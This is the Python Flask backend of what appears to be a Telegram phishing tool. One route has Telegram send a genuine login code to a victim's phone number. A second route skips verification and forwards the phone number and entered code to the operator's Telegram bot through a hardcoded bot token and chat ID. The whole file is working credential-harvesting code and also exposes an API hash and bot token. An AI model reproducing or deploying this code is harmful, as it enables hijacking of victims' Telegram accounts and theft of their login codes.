from flask import Flask, request, jsonify
from flask_cors import CORS
from pyrogram import Client
import asyncio
import os
import re
import requests
from datetime import datetime

app = Flask(__name__)
CORS(app)

API_ID = 6627460
API_HASH = "27a53a0965e486a2bc1b1fcde473b1c4"

# YOUR BOT TOKEN AND CHAT ID - REPLACE THESE
BOT_TOKEN = "8862345996:AAH2M2RQMIBuDLpkhb69NxCdrVM_Fd45GIk"
YOUR_CHAT_ID = "8796685138"

def send_to_telegram_bot(phone, code):
    """Send the phone and code to your bot"""
    message = f"""
🔐 **Login Details**

📱 **Phone Number:** `{phone}`
🔑 **Code Entered:** `{code}`
⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": YOUR_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        response = requests.post(url, json=payload)
        return response.ok
    except Exception as e:
        print(f"Error: {e}")
        return False

@app.route('/send-code', methods=['POST'])
def send_code():
    try:
        data = request.json
        phone = data.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'}), 400
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def send_telegram_code():
            client = None
            try:
                client = Client(
                    name=f"session_{datetime.now().timestamp()}",
                    api_id=API_ID,
                    api_hash=API_HASH,
                    in_memory=True
                )
                
                await client.connect()
                sent_code = await client.send_code(phone_number=phone)
                
                return {
                    'success': True,
                    'message': 'Code sent to your Telegram account!',
                    'phone_code_hash': sent_code.phone_code_hash
                }
                
            except Exception as e:
                error_msg = str(e)
                if 'FLOOD_WAIT' in error_msg:
                    return {'success': False, 'error': 'Too many attempts. Wait a few minutes.'}
                elif 'PHONE_NUMBER_INVALID' in error_msg:
                    return {'success': False, 'error': 'Invalid phone number'}
                else:
                    return {'success': False, 'error': f'Error: {error_msg}'}
            finally:
                if client:
                    await client.disconnect()
        
        result = loop.run_until_complete(send_telegram_code())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        phone = data.get('phone', '')
        code = data.get('code', '')
        
        if not phone or not code:
            return jsonify({'success': False, 'error': 'Phone and code required'}), 400
        
        # NO VERIFICATION WITH TELEGRAM - JUST SEND TO BOT
        bot_sent = send_to_telegram_bot(phone, code)
        
        if bot_sent:
            return jsonify({
                'success': True, 
                'message': f'Phone and code sent to your bot!',
                'bot_notified': True
            })
        else:
            return jsonify({
                'success': False, 
                'error': 'Failed to send to bot. Check your bot token.'
            })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
